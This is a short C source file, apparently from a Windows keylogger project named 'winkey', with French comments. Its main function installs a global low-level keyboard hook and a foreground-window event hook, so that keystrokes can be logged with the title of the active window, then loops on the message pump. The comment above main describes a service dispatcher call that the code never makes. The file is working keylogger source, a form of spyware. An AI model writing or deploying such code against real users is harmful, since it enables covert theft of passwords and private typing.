#include "winkey.h"

HHOOK winHook;
HWND gh_hwndMain;
BOOL foregroundWindowChanged;
char foregroundWindowTitle[4096];

/**
 * @function StartServiceCtrlDispatcher() :
 * Connecte le thread principal d’un processus de service au gestionnaire de contrôle de service,
 * ce qui entraîne le thread comme thread de répartiteur de contrôle de service pour le processus appelant.
 */
int main(int argc, char **argv)
{
    (void)argc;
    (void)argv;
    winHook = SetWindowsHookExA(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    HWINEVENTHOOK winEvt = SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, NULL, WinEventProc, 0, 0, WINEVENT_OUTOFCONTEXT);
    if (winHook == NULL || winEvt == NULL)
        exit(PrintError());
    foregroundWindowChanged = TRUE;
    GetWindowTitle(GetForegroundWindow());
    MSG msg;
    while (1)
    {
        if (GetMessage(&msg, NULL, 0, 0))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }
    UnhookWinEvent(winEvt);
    UnhookWindowsHookEx(winHook);
}
